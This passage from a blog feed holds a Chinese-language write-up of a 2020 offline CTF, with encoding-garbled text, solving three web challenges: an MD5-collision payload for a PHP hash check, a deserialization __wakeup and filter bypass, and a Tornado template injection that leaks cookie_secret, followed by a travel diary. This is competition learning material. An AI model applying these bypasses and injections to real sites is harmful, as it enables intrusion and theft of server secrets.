src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A9FC6073550E88485B7A91C2A771C019.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/61FEC196297E9A085E015DDEF836334A.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/95DC7AF1D9C5818DAAA35F29CDC89319.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°å­—ç”µè·¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020è¥¿å¤§çº¿ä¸‹èµ›æ€»ç»“</title>
      <link href="/posts/57329/"/>
      <url>/posts/57329/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>è¿™æ˜¯ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹ AWD çš„ CTF æ¯”èµ›ï¼Œä½†æ˜¯æ„Ÿè§‰èµ›åˆ¶ä¸å¤Ÿæ­£å®—ï¼Œå±…ç„¶æ˜¯è§£é¢˜å’Œæ‰“é¶æœºä¸¤ä¸ªæ¨¡å—åˆ†å¼€æ¥çš„ï¼Œä¹‹å‰ä¸€ç›´ä»¥ä¸ºæ˜¯æŠŠé¢˜ç›®æ”¾åˆ°é¶æœºä¸Š</p></blockquote><p>è¿™æ¬¡æ¯”èµ›æˆ‘çš„é˜Ÿä¼æ²¡æœ‰å–å¾—å¾ˆå¥½çš„åæ¬¡ï¼Œæˆ‘è§‰å¾—åŸå› è¿˜æ˜¯åœ¨æˆ‘ï¼Œç¬¬ä¸€æ˜¯ç¡¬å®åŠ›ä¸å¤Ÿå¼ºï¼Œç¬¬äºŒæ˜¯å¿ƒæ€ä¸å¤Ÿæ²‰ç¨³ï¼Œç¬¬ä¸‰æ˜¯å¿½ç•¥äº†å›¢é˜Ÿçš„ä½œç”¨</p><p>å¤ç° Web é¢˜</p><h2 id="1ã€hash"><a href="#1ã€hash" class="headerlink" title="1ã€hash"></a>1ã€hash</h2><p>å³é”®æŸ¥çœ‹æºç å‘ç° waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;*********************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç ä¸èƒ½ä¸è´¦æˆ·ç›¸åŒ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])==<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;è´¦æˆ·ä¸å¯†ç md5å€¼ä¸ç›¸ç­‰&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;è´¦æˆ·ä¸å¯†ç sha1å€¼ä¸ç›¸ç­‰ :(&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå¸¸è§„çš„é¢˜å‹äº†</p><p>sha1å‡½æ•°ç”¨æ•°ç»„ç»•è¿‡ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶ï¼Œsha1å‡½æ•°è§£æé”™è¯¯è¿”å› False å®Œæˆ if æ¡ä»¶æ¯”è¾ƒusername[]&#x3D;xxx,password[]&#x3D;xxx</p><p>md5 å‡½æ•°å¼ºæ¯”è¾ƒæ˜¯ md5 å€¼ç¢°æ’ç»•è¿‡ï¼Œå¦‚æœæ˜¯å¸¸è§„å¼ºæ¯”è¾ƒå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¼ è¿›å»ä¸¤ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„å€¼ä¸ç›¸ç­‰ï¼Œé€ æˆ md5 åŠ å¯†æ—¶æŠ¥é”™äº§ç”Ÿ NULL&#x3D;NULL çš„æƒ…å†µï¼Œç»•è¿‡æ¯”è¾ƒï¼Œä½†æ˜¯<strong>implodeå‡½æ•°æ˜¯æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</strong>ï¼Œä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username[]=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;</span><br><span class="line">password[]=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201024221100.png" alt="flag"></p><h2 id="2ã€dHd"><a href="#2ã€dHd" class="headerlink" title="2ã€dHd"></a>2ã€dHd</h2><blockquote><p>è¿™é¢˜å°±æ˜¯è®©æˆ‘æ¯”èµ›æ²¡æœ‰å–å¾—æ›´å¥½æˆç»©çš„åŸå› </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line"><span class="variable">$gogogo</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">str_ireplace</span>([<span class="string">&#x27;fl@g&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>],<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;file));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§„å¾—ä¸èƒ½å†å¸¸è§„çš„ä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œ20 åˆ†é’Ÿå®¡å®Œä»£ç </p><blockquote><p><code>file_get_contents() </code>ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œ</p></blockquote><blockquote><p><code>str_ireplace() </code>:æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š<code>str_ireplace(&quot;WORLD&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);</code>æŠŠå­—ç¬¦ä¸² â€œHello world!â€ ä¸­çš„å­—ç¬¦ â€œWORLDâ€ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ›¿æ¢æˆ â€œPeterâ€ï¼š</p></blockquote><p>GETæ–¹å¼ ä¼ è¿›å»ä¸€ä¸ª $file ï¼Œ<code>file_get_contents</code>å‡½æ•°æŠŠæ–‡ä»¶è¯»å–æˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ $file åº”è¯¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç»“åˆé¢˜ç›®å’Œåé¢çš„è¿‡æ»¤ï¼ŒçŒœæµ‹æ˜¯<code>fl@g.php</code>ï¼Œ<code>base64_decode</code>è§£å¯†ï¼ŒæŠŠå­—ç¬¦ä¸²ååºåˆ—åŒ–</p><p>è¿›å…¥ class ç±»ï¼Œååºåˆ—åŒ–çš„æ—¶å€™<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ä¼šè‡ªåŠ¨è¿è¡Œï¼Œä¼šæŠŠ $file çš„åå­—æ”¹ä¸º <code>index.php</code>ï¼Œæ‰€ä»¥è¿™é¢˜ç¬¬ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯ç»•è¿‡<code>__wakeup()</code>å‡½æ•°ï¼Œæ–¹æ³•å¾ˆç®€å•ï¼Œè¿™ä¸ªå‡½æ•°æœ‰å®ƒè‡ªå·±çš„æ¼æ´ï¼Œç¬¬äºŒä¸ªè€ƒç‚¹åœ¨å¯¹è±¡å®ä¾‹åŒ–åé”€æ¯çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç±»é‡Œé¢çš„<code>__destruct</code>å‡½æ•°ï¼Œè¿‡æ»¤æ‰<code>fl@g</code>å­—æ®µï¼Œç»•è¿‡è¿™ä¸ªå‡½æ•°çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼ŒåŒå†™ç»•è¿‡ï¼Œ<code>flfl@g@g.php</code>ï¼Œstr_ireplaceå‡½æ•°æŠŠ<code>fl@g</code>æ›¿æ¢æˆç©ºåç•™ä¸‹æ¥çš„è¿˜æ˜¯<code>fl@g.php</code></p><p>æœ€åéœ€è¦ç”¨ <code>php://input</code>ä¼ªåè®®</p><blockquote><p>å¯¹äº<code>php://input</code>ä»‹ç»</p><p>PHPå®˜æ–¹æ‰‹å†Œæ–‡æ¡£æœ‰ä¸€æ®µè¯å¯¹å®ƒè¿›è¡Œäº†å¾ˆæ˜ç¡®åœ°æ¦‚è¿°ã€‚<br>&#x3D;&#x3D;â€œphp:&#x2F;&#x2F;input allows you  to read raw POST data. It is a less memory intensive alternative  to$HTTP_RAW_POST_DATA and does not need any special php.ini directives.  php:&#x2F;&#x2F;input is not available with enctype&#x3D;â€multipart&#x2F;form-dataâ€.&#x3D;&#x3D;</p><p>ç¿»è¯‘è¿‡æ¥ï¼Œæ˜¯è¿™æ ·ï¼š<br>&#x3D;&#x3D;â€œphp:&#x2F;&#x2F;inputå¯ä»¥è¯»å–æ²¡æœ‰å¤„ç†è¿‡çš„POSTæ•°æ®ã€‚ç›¸è¾ƒäº$HTTP_RAW_POST_DATAè€Œè¨€ï¼Œå®ƒç»™å†…å­˜å¸¦æ¥çš„å‹åŠ›è¾ƒå°ï¼Œå¹¶ä¸”ä¸éœ€è¦ç‰¹æ®Šçš„php.iniè®¾ç½®ã€‚php:&#x2F;&#x2F;inputä¸èƒ½ç”¨äºenctype&#x3D;multipart&#x2F;form-dataâ€&#x3D;&#x3D;</p><blockquote><p>è¿™é‡Œæ˜¯è‡ªå·±çš„ç†è§£</p><p><code>file_get_contents</code>å‡½æ•°æœ¬è´¨ä¸Šæ˜¯å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ç„¶åå»è®¿é—®ä¸€ä¸ªåœ°å€ï¼Œç„¶åå–å‡ºå…¶ä¸­çš„å†…å®¹è¿”å›æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œ <code>php://input</code>ä¼ªåè®®è®¿é—®æ–‡ä»¶çš„åªè¯»æµèƒ½å¤Ÿå®šä½åˆ° POST è¡¨å•ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿”å›ä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥èƒ½å¤Ÿè®©<code>file_get_contents</code>ç›´æ¥è¯»åˆ° POST è¡¨å•çš„æ•°æ®å½“æˆè¿”å›å€¼</p></blockquote></blockquote><h2 id="3ã€inj"><a href="#3ã€inj" class="headerlink" title="3ã€inj"></a>3ã€inj</h2><p>åˆšå¼€å§‹è¿›æ¥çœ‹åˆ°é¢˜ç›®ï¼Œä¿¡æ¯è¿˜æ˜¯æŒºå¤šçš„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016234902.png" alt="åˆè§"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">file?filename=/flag.txt&amp;filehash=949e1b3d04ef60ff02ffc6f6bb34fdae</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">file?filename=/welcome.txt&amp;filehash=f123ac29baec2ab4ba71527c69fb5e27</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line">file?filename=/hints.txt&amp;filehash=25e57d65d8b56f0088974e199fafd121</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡ç‚¹å¼€å‘ç°å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼Œé€šè¿‡è§‚å¯Ÿå‘ç°<code>file?filename=/æ–‡ä»¶å&amp;æ–‡ä»¶çš„md5å€¼</code>ï¼Œå…¶ä¸­ hints.txt é‡Œé¢æç¤º<code>md5(cookie_secret+md5(filename))</code>ï¼Œwelcome.txt é‡Œé¢æç¤ºä¸€ä¸ª<code>render</code>æ˜¯æ¸²æŸ“çš„æ„æ€ï¼Œflag.txt é‡Œé¢æ˜¯é€šçŸ¥ä¸€å£° flag åœ¨<code>fllllllllllllag</code>é‡Œé¢ï¼Œè¿™ä¸ªé¢˜çš„é¢˜ç›®é‡Œ<code>tornado</code>æ˜¯ Python çš„ä¸€ä¸ªæ¨¡æ¿</p><p>å½“æœ‰æ–‡ä»¶åæˆ–æ–‡ä»¶md5å€¼ä¸åŒ¹é…æ—¶ï¼Œå°†ä¼šè·³è½¬åˆ° Error é¡µé¢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016235931.png" alt="Error"></p><blockquote><p>è¿™é¢˜æ˜¯SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥</p></blockquote><p>å› æ­¤ï¼Œé€šè¿‡<code>handler.application</code>å³å¯è®¿é—®æ•´ä¸ªtornadoã€‚ç®€å•è€Œè¨€é€šè¿‡<code>&#123;&#123;handler.application.settings&#125;&#125;</code>æˆ–è€…<code>&#123;&#123;handler.settings&#125;&#125;</code>å°±å¯è·å¾—<code>settings</code>ä¸­çš„**<code>cookie_secret</code>**</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016234807.png" alt="cookie_secert"></p><p>æ‰¾ä¸ª md5 åŠ å¯†ç½‘ç«™æä¸€æå°±å‡ºæ¥äº†</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201017003214.png" alt="flag"></p><h1 id="æµæ°´è´¦"><a href="#æµæ°´è´¦" class="headerlink" title="æµæ°´è´¦"></a>æµæ°´è´¦</h1><h2 id="10-23"><a href="#10-23" class="headerlink" title="10.23"></a>10.23</h2><p>23å·æ²¡å•¥å¥½è¯´çš„ï¼Œåœ¨å­¦æ ¡æ‰“è½¦å»ç«è½¦ç«™åŠå¤©æ‰“ä¸åˆ°ï¼Œå·®ç‚¹æ€¥æ­»äººï¼ŒåäºŒç‚¹çš„è½¦ï¼Œåˆ°å—å®åååœ°é“ï¼Œç„¶åèµ°è·¯åˆ°é…’åº—ä»¥åŠå¤©é»‘äº†ï¼Œç„¶åå§šè€å¸ˆè¯·å¤§å®¶åƒäº†é¥­ï¼ŒçœŸå¥½</p><p>åƒå®Œé¥­å·å·æ‹¿äº†æ¯”èµ›ç‰Œå»æ‰¾äº†åœ¨è¥¿å¤§çš„é«˜ä¸­åŒæ¡Œç©</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027201147.png"></p><p>ä¿©äººé€›äº†è¥¿å¤§å¥½å¤§ä¸€åœˆï¼Œæˆ‘å‘ç°æ¡‚ç”µå’Œè¥¿å¤§éƒ½æŒºå¤§çš„ï¼Œä½†æ˜¯å°±æ˜¯æ„Ÿè§‰æ¡‚ç”µå°å°æ°”æ°”çš„ï¼Œåæ¥å’Œé˜Ÿå‹æ€»ç»“äº†ä¸€ä¸‹ï¼Œå‘ç°è¥¿å¤§çš„å»ºç­‘ã€æ¥¼ï¼Œæ™®éé«˜å¤§å®ä¼Ÿæœ‰æ’é¢ï¼Œæ¡‚ç”µçš„æ¥¼å§ï¼Œæˆ‘å§‘ä¸”è¯´æ˜¯å’±å­¦æ ¡ä½è°ƒå§</p><p><img src="https://s1.ax1x.com/2020/10/27/BlEp6A.jpg" alt="è¥¿å¤§æœ‰æ’é¢çš„æ¥¼"></p><p>è¥¿å¤§è‡ªäº§è‡ªé”€çš„ç‰›å¥¶ç‰¹åˆ«å¥½å–ï¼Œå°±æ˜¯æ„Ÿè§‰ä¸€ç“¶æœ‰ç‚¹å°‘ï¼Œå‡ å£å°±é—·æ²¡äº†ï¼Œä½†æ˜¯çœŸçš„ç‰¹åˆ«å¥½å–</p><p>å¥½å…„å¼Ÿè¿˜å¸¦æˆ‘å»é€›äº†ä»–åœ¨çš„é‚£ä¸ªå­¦é™¢ï¼Œå‚è§‚çš„æ—¶å€™å‘ç”Ÿäº†å¥½ç©çš„äº‹æƒ…ï¼Œåœ¨ã€ŠåŒ…è£…è®¾è®¡å¸ˆå¿…è¯»æ‰‹å†Œã€‹æ—è¾¹æœ‰ä¸€æ¯å–å®Œçš„ç›Šç¦¾å ‚ï¼Œè¿™ä¸€ç‰ˆå¢™éƒ½æ˜¯å±•ç¤ºè£è€€ã€å¥–çŠ¶å’Œå‡ºç‰ˆä½œå“çš„ï¼Œæˆ‘å·®ç‚¹ä»¥ä¸ºè¿™ä¸ªç›Šç¦¾å ‚çš„åŒ…è£…ä¹Ÿæ˜¯ä¸ªè£èª‰ä½œå“ï¼Œå‡ºè‡ªè¥¿å¤§ä¹‹æ‰‹</p><p><img src="https://s1.ax1x.com/2020/10/27/BlA6Lq.jpg" alt="æ³¨æ„ç»†èŠ‚"></p><p>é€›çš„å·®ä¸å¤šäº†ï¼Œè·Ÿå¥½å…„å¼Ÿäº¤ä»£äº†ä¸€ç‚¹äº‹ä¹‹åå°±å›åˆ°é…’åº—å‘¼å‘¼å¤§ç¡äº†</p><h2 id="10-24"><a href="#10-24" class="headerlink" title="10.24"></a>10.24</h2><p>æ¯”èµ›çš„æ—¥å­ï¼Œæˆ‘è¿™ä¸ªå­¦æœŸç¬¬ä¸€æ¬¡æ—©ä¸Šå…­ç‚¹åŠèµ·åºŠï¼ŒçœŸä¸é”™ï¼Œæ—©èµ·çœŸä¸é”™</p><p>å¤§å®¶æ”¶æ‹¾å¥½é›†åˆäº†ä»¥åå°±è·‘å»è¥¿å¤§åƒæ—©ç‚¹äº†ï¼Œå°±æ™®æ™®é€šé€šåƒäº†ä¸€ç¢—æ¡‚æ—ç±³ç²‰ï¼Œè™½ç„¶å‘³é“ä¸é”™ä½†è¿˜æ˜¯æ²¡æœ‰æ¡‚æ—çš„æ„Ÿè§‰ï¼Œå­¦é•¿è¯´æ˜¯é…¸ç¬‹ä¸å¤Ÿè‡­</p><p>æ¥ä¸‹æ¥å°±åˆ°äº†æ¯”èµ›çš„ç°åœºï¼ŒèŸèƒæ¥¼7æ¥¼ï¼Œè¿™æ¥¼æ˜¯çœŸçš„æ¼‚äº®ï¼Œç¤¼ä»ªå°å§å§ä¼°è®¡æ˜¯è¥¿å¤§çš„ç¤¼ä»ªé˜Ÿçš„ï¼Œä¹Ÿå¾ˆæ¼‚äº®</p><p><img src="https://s1.ax1x.com/2020/10/27/BlE2jA.jpg" alt="ä¸¢äººç°åœº"></p><p>è¯´åˆ°æ¯”èµ›åœºåœ°ï¼Œæˆ‘çœŸçš„å¯¹æ¯”èµ›åçš„é‚£ä¸ªæ¤…å­éå¸¸æ»¡æ„ï¼Œè™½ç„¶å…¶è²Œä¸æ‰¬ï¼Œä½†æ˜¯çœŸçš„ç‰¹åˆ«ç‰¹åˆ«èˆ’æœï¼ŒåèƒŒé çš„é‚£ä¸ªåœ°æ–¹æ˜¯å¯ä»¥è°ƒèŠ‚çš„ï¼Œåšå¾ˆä¹…äº†è…°å’Œè„–å­éƒ½ä¸ä¼šå¾ˆç´¯</p><p><img src="https://s1.ax1x.com/2020/10/27/BlVUPS.jpg" alt="å¾ˆèˆ’æœçš„æ¤…å­"></p><p>æ¯”èµ›å†…å®¹åˆ†æˆäº†ä¸¤ä¸ªæ¨¡å—ï¼Œä¸€ä¸ªæ˜¯ ctf å¸¸è§„è§£é¢˜ï¼Œå¦ä¸€è¾¹æ˜¯æ‰“é¶æœºï¼Œä½†æ˜¯æ¯ä¸ªé˜ŸåŸºæœ¬ä¸Šéƒ½åœ¨åšé¢˜ï¼Œä¸€ä¸ªä¸Šåˆè¿‡å»äº†ï¼Œå¤§å®¶éƒ½è¯´è¿™é¶æœºæ˜¯è™šç©ºé¶æœºï¼Œæ‰¾éƒ½æ‰¾ä¸åˆ°åœ¨å“ªï¼Œåªèƒ½åƒåƒå½©è›‹å’Œçº¿ç´¢çš„çƒ‚åˆ†ï¼Œè¯´åˆ°é¢˜ï¼Œæ¯”èµ›å±…ç„¶æ²¡æœ‰ pwn é¢˜ï¼Œæå¾— pwn å¸ˆå‚…ååˆ†ä¸æ»¡æ„ï¼Œå·®ç‚¹å½“åœºé€€å½¹ï¼Œåªèƒ½æ‰“æ‰“é€†å‘ç©ä¸€ç©</p><p>æ‰“åˆ°ä¸­åˆï¼Œè¥¿å¤§ç»™å¤§å®¶å‡†å¤‡äº†ç›’é¥­ï¼Œå°±å¾ˆå¸¸è§„çš„é£Ÿå ‚é¥­ï¼Œè¿˜è¡Œï¼Œè·Ÿæ¡‚ç”µçš„å·®ä¸äº†å¤šå°‘ï¼Œåƒå®Œé¥­å°±ç»§ç»­æ‰“æ¯”èµ›äº†</p><p>æ‰“å®Œæ¯”èµ›ä»¥åï¼Œå§šè€å¸ˆå¸¦æˆ‘ä»¬å’Œä»¥å‰æ¯•ä¸šçš„å­¦é•¿ä¸€èµ·åƒäº†ä¸ªé¥­ï¼Œç„¶åå­¦é•¿ç»™æˆ‘ä»¬è¯´äº†å¥½å¤šå¥½å¤šè¯ï¼Œè™½ç„¶å¯èƒ½æ˜¯å–å¤šäº†ï¼Œä½†æ˜¯è¯´çš„è¯æ— éç»•ä¸å¼€<code>åŠªåŠ›</code>ã€<code>å¸¦å­¦å¼Ÿ</code>å’Œ<code>ä¼ æ‰¿</code>ä¸‰ä¸ªå…³é”®å­—ï¼Œä¿¡æ¯å®‰å…¨å‘å±•è‡³ä»Šæ¯•ç«Ÿè¿˜æ˜¯å°åœˆå­ï¼Œä¹‹æ‰€ä»¥æœ‰é‚£ä¹ˆå¤šå†…æ¨çš„åé¢ï¼Œæœ€å¤§çš„åŸå› è¿˜æ˜¯ä¼ æ‰¿ï¼Œæ¯ä¸ªå­¦æ ¡éƒ½æœ‰ä¿¡æ¯å®‰å…¨çš„ç¤¾å›¢ï¼Œç¤¾å›¢å†…çš„ä¸€è„‰ç›¸ä¼ ï¼Œä¸ç®¡æ˜¯æŠ€æœ¯ä¸Šè¿˜æ˜¯ç²¾ç¥ä¸Šï¼Œéƒ½æ˜¯ä¸€ç§ä¼ æ‰¿ï¼Œåœ¨è‰¯å¥½çš„æ°›å›´ä¸‹ï¼Œè¿˜éœ€è¦æ¯ä¸ªäººéƒ½ä¸æ–­çš„åŠªåŠ›ï¼Œä»æ—©åˆ°æ™šï¼Œä»å‘¨ä¸€åˆ°å‘¨æ—¥ï¼Œä»å­¦æœŸå¼€å§‹åˆ°å­¦æœŸç»“æŸï¼Œä»å¤§ä¸€åˆ°å¤§å››â€¦â€¦æ‰€ä»¥ä»¥åå¾—æ›´åŠ åŠªåŠ›ï¼ŒåŠªåŠ›æå‡è‡ªå·±</p><p>åƒå®Œé¥­å›åˆ°é…’åº—æ´—äº†ä¸ªæ¾¡ï¼Œè·Ÿèˆå‹å»é€›äº†é€›å‘¨è¾¹çš„å¤œå¸‚æ•£äº†æ•£æ­¥ï¼Œä¹°äº†æ¯æœèŒ¶å°±æ•£æ­¥å›åˆ°é…’åº—ç»§ç»­å‘¼å‘¼å¤§ç¡äº†</p><h2 id="10-25"><a href="#10-25" class="headerlink" title="10.25"></a>10.25</h2><p>å½’å®¶çš„æ—¥å­ï¼Œç¡ä¸æƒ¯é…’åº—çš„è¢«å­ï¼Œå¯¼è‡´æˆ‘å› ä¸ºè¸¢è¢«å­æ—©ä¸Šäº”å…­ç‚¹å°±é†’äº†ï¼Œå†ä¸€è§‰é†’æ¥ä¹ç‚¹åŠï¼Œè§‰å¾—æ¥å—å®æ²¡æœ‰åƒä¸ªè€å‹ç²‰è¿˜æ˜¯å¯¹ä¸èµ·è¿™å¼ è½¦ç¥¨çš„ï¼Œç„¶åä¸€èµ·å»åƒäº†ä¸ªè€å‹ç²‰ï¼Œå‘³é“è¿˜è¡Œï¼Œä¸‹æ¬¡æ¥æ‰¾æœ‹å‹æ¨èå‡ å®¶æ­£å®—çš„å»è¯•ä¸€è¯•</p><p><img src="https://s1.ax1x.com/2020/10/27/Blnaoq.jpg" alt="è€å‹ç²‰"></p><p>ååœ°é“å»ç«è½¦ç«™ï¼Œå›æ¡‚ç”µï¼Œæ´—è¡£æœï¼Œç¡ä¸€è§‰ï¼Œèµ·æ¥å¹²æ´»(è¡¥ä½œä¸š)</p><p>è¿™å¤©æœ€å€’éœ‰çš„å°±æ˜¯åˆ°äº†æ¡‚æ—åŒ—ç«™ï¼Œå­¦é•¿è¯´æä¸ªå…±äº«æ±½è½¦å¼€å›å»ï¼Œç»“æœå…±äº«æ±½è½¦åˆšå¼€å‡ºåœè½¦ä½æ²¡å‡ æ­¥å°±æ²¡ç”µæ‰“ä¸èµ·ç«äº†ï¼Œç„¶ååˆæ»´æ»´æ‰“è½¦å›åˆ°äº†å­¦æ ¡ï¼Œè¿˜æ¯”è‡ªå·±å¼€è½¦ä¾¿å®œ</p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´»æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
